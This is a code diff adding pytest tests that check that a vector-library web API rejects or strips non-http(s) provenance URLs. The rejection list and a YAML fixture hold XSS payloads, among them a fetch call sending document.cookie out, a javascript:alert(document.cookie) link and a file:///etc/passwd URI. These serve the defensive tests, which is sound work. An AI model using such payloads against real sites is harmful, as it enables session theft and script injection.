@@ -1484,3 +1484,62 @@ def test_throttle_queue_full_maps_to_http_429(client, monkeypatch):
     monkeypatch.setattr(src, "_next_slot", {"rest.ensembl.org": src.time.monotonic() + 50})
     r = c.get("/api/vectors/import/ensembl/lookup/ENSG00000139618")
     assert r.status_code == 429 and "排队" in r.json()["detail"]
+
+
+# ================================================================ 出处 URL 只收 http(s)（审查 M5）
+
+_MAP_PAYLOAD = {"name": "urlCheck", "sequence": SEQ300, "topology": "circular",
+                "features": [], "source": "paste"}
+
+
+@pytest.mark.parametrize("bad", [
+    "javascript:alert(1)", " JavaScript:fetch('//x/'+document.cookie)", "data:text/html,<b>",
+    "vbscript:msgbox", "file:///etc/passwd", "//evil.example/x", "ftp://x/y", "http://",
+    "https://exa mple.com",
+])
+def test_save_map_as_vector_rejects_non_http_url(client, vectors_dir, bad):
+    c, _ = client
+    r = c.post("/api/vectors/import/from-map", json=dict(_MAP_PAYLOAD, url=bad),
+               headers=_admin())
+    assert r.status_code == 422, r.text
+    assert list(vectors_dir.iterdir()) == []
+
+
+def test_save_map_as_vector_accepts_http_url(client, vectors_dir):
+    c, _ = client
+    for i, ok in enumerate(("https://www.ncbi.nlm.nih.gov/nuccore/L09137", "HTTP://example.org/a?b=1", "")):
+        r = c.post("/api/vectors/import/from-map",
+                   json=dict(_MAP_PAYLOAD, name=f"urlOk{i}", url=f"  {ok}  "), headers=_admin())
+        assert r.status_code == 200, r.text
+        assert r.json()["vector"]["url"] == ok.strip()
+        assert r.json()["vector"]["provenance"].get("url", "") == ok.strip()
+
+
+def test_provenance_url_sanitized_on_read(client, vectors_dir):
+    """手改 YAML / 旧版本写入的 javascript: 链接：读取时丢弃，不下发给前端"""
+    (vectors_dir / "evil.yaml").write_text(
+        "id: evil_vec\nname: evil\nsequence: ACGTACGTACGT\n"
+        "data_provenance:\n  source: x\n  url: \"javascript:alert(document.cookie)\"\n"
+        "  map_url: \"data:text/html,x\"\n  doc_url: \"https://example.org/doc\"\n"
+        "features:\n- name: f\n  type: CDS\n  start: 1\n  end: 3\n", encoding="utf-8")
+    v = _load_vector(vectors_dir, "evil_vec")
+    assert v is not None and v.provenance == {"source": "x", "doc_url": "https://example.org/doc"}
+    from app.design_service import invalidate_vector_library_cache
+    invalidate_vector_library_cache()
+    c, _ = client
+    d = c.get("/api/vectors/evil_vec")
+    assert d.status_code == 200, d.text
+    assert "url" not in d.json()["data_provenance"]
+    assert "javascript" not in d.text
+
+
+def test_save_record_drops_non_http_urls(tmp_path):
+    from app.vector_import import provenance_block, record_from_parts, save_record
+    rec = record_from_parts(name="direct", sequence=SEQ300)
+    res = save_record(rec, source="x", vectors_dir=str(tmp_path), url="javascript:alert(1)",
+                      provenance=provenance_block("t", url="javascript:alert(1)",
+                                                  page_url="https://ok.example/p"))
+    assert res["url"] == "" and "url" not in res["provenance"]
+    assert res["provenance"]["page_url"] == "https://ok.example/p"
+    text = next(tmp_path.glob("*.yaml")).read_text(encoding="utf-8")
+    assert "javascript" not in text
